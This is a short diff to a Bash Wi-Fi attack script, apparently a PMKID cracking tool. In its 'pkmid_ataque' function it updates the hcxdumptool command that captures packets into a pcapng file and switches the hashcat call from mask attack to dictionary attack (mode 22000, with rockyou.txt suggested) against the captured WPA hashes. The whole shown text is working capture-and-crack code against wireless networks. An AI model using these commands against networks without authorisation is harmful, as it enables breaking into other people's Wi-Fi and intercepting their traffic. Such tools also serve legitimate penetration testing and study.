@@ -350,7 +350,7 @@ pkmid_ataque() {
 	echo -e "${blueColour}[!]$grayColour Recommendation: 600 seconds (10 minutes)"
 	echo -ne "$purpleColour[?]$grayColour How many seconds do you want the packet capture to last?: " && read seg
 	$cleancolor
-	xterm -hold -e "hcxdumptool -i $tar -o Capture.pcapng --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
+	xterm -hold -e "hcxdumptool -i $tar -w ${pathmain}/Capture.pcapng -F --rds=1" &
 	hcxdumptool_PID=$!
 	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
     echo -e "\n${redColour}[%]$grayColour Capturing packages\n"
@@ -366,7 +366,7 @@ pkmid_ataque() {
 		echo -e "\n${blueColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
 		echo -ne "${greenColour}[?]$grayColour Dictionary path to use: " && read dicc1
 		tput civis
-		hashcat -a 3 -m 22000 hash.hc22000 $dicc1
+		hashcat -a 0 -m 22000 hash.hc22000 $dicc1
 	else 
 		echo -e "\n${redColour}[!]$grayColour The required package could not be captured"
 		sleep 3
